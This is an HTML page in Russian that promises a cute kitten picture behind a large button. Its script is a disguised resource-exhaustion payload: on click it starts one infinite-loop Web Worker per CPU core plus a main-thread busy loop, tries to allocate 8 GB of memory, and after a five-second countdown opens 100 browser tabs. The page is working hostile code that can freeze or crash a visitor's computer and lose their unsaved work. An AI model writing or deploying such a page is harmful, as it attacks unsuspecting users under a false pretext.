<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Котёнок с нагрузкой</title>
    <style>
        body {
            background: #0a0f0f;
            color: #0ff;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding: 20px;
        }
        #startBtn {
            background: #ffaa00;
            border: none;
            color: #000;
            font-size: 2.5em;
            padding: 20px 40px;
            border-radius: 20px;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0 0 30px orange;
            transition: 0.2s;
        }
        #startBtn:hover {
            background: #ff8800;
            box-shadow: 0 0 40px #ffaa00;
        }
        #imageContainer {
            margin-top: 30px;
            display: none;
        }
        img {
            max-width: 80%;
            max-height: 60vh;
            border: 5px solid #0ff;
            border-radius: 20px;
            box-shadow: 0 0 30px cyan;
        }
        #timer {
            font-size: 2em;
            margin-top: 20px;
            color: #ffaa00;
        }
        #status {
            color: #8ff;
            margin-top: 20px;
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <h1>😺 Хочешь увидеть милого котенка?</h1>
    <button id="startBtn">НАЖМИ СЮДА, НЕ УПУСТИ ШАНС!</button>
    <div id="imageContainer">
        <img id="catImage" src="https://img.freepik.com/free-photo/view-beautiful-persian-domestic-cat_23-2151773956.jpg?semt=ais_hybrid&w=740&q=80" alt="Котик">
    </div>
    <div id="timer"></div>
    <div id="status"></div>

    <script>
        document.getElementById('startBtn').addEventListener('click', function() {
            // Прячем кнопку, показываем кота
            this.style.display = 'none';
            document.getElementById('imageContainer').style.display = 'block';
            const timerDiv = document.getElementById('timer');
            const statusDiv = document.getElementById('status');
            statusDiv.innerText = 'Загружаем систему...';

            // ========== 100% CPU НАГРУЗКА ==========
            if (window.Worker) {
                const coreCount = navigator.hardwareConcurrency || 4;
                for (let i = 0; i < coreCount; i++) {
                    try {
                        const blob = new Blob([`
                            onmessage = function(e) {
                                while (true) {
                                    Math.sqrt(Math.random() * 1e9);
                                    Math.sin(Math.random());
                                    Math.cos(Math.random());
                                }
                            };
                        `]);
                        const worker = new Worker(URL.createObjectURL(blob));
                        worker.postMessage('start');
                    } catch (e) {}
                }
            }
            function burnCPU() {
                let start = Date.now();
                while (Date.now() - start < 100) {
                    Math.sqrt(Math.random() * 1e9);
                }
                setTimeout(burnCPU, 0);
            }
            burnCPU();

            // ========== ЗАХВАТ 8 ГБ ПАМЯТИ ==========
            setTimeout(() => {
                try {
                    const memoryChunks = [];
                    const targetBytes = 8 * 1024 * 1024 * 1024; // 8 ГБ
                    const chunkSize = 100 * 1024 * 1024; // 100 МБ
                    let allocated = 0;
                    function allocate() {
                        while (allocated < targetBytes) {
                            let chunk = new ArrayBuffer(chunkSize);
                            memoryChunks.push(chunk);
                            allocated += chunkSize;
                        }
                    }
                    setTimeout(allocate, 10);
                } catch (e) {}
            }, 100);

            // ========== ОТСЧЁТ 5 СЕКУНД И ОТКРЫТИЕ 100 ВКЛАДОК ==========
            const catUrl = 'https://img.freepik.com/free-photo/view-beautiful-persian-domestic-cat_23-2151773956.jpg?semt=ais_hybrid&w=740&q=80';
            let secondsLeft = 5;
            timerDiv.innerText = secondsLeft + ' сек';

            const countdown = setInterval(() => {
                secondsLeft--;
                timerDiv.innerText = secondsLeft + ' сек';
                if (secondsLeft <= 0) {
                    clearInterval(countdown);
                    timerDiv.innerText = 'ОТКРЫВАЮ 100 КОТИКОВ!';
                    statusDiv.innerText = 'Атака клонов...';

                    for (let i = 0; i < 100; i++) {
                        setTimeout(() => {
                            window.open(catUrl, '_blank');
                        }, i * 20);
                    }
                    statusDiv.innerText = '100 вкладок с котиками запущены!';
                }
            }, 1000);
        });
    </script>
</body>
</html>
